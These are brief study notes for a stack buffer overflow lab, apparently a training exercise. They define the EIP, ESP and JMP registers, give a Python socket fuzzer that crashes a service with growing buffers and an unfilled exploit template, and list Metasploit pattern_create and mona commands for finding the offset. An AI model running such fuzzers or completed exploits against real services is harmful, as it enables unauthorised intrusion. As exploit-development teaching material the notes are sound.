EIP =>The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command.\

ESP=>The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.\

JMP =>The Jump (JMP) is an instruction that modifies the flow of execution where the operand you designate will contain the address being jumped to.\

\x41, \x42, \x43 =>The hexadecimal values for A, B and C. For this exercise, there is no benefit to using hex vs ascii, it’s just my personal preference.\



use Immunity Debugger

fuzzer
`#!/usr/bin/env python3
import socket, time, sys
ip = "<IP>"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "
string = prefix + "A" * 100
while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)`

exploit

`import socket
ip = "<IP>"
port = <PORT>
prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
`


On kali 
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGHT>`

In mona 
`!mona findmsp -distance <LENGHT>?`

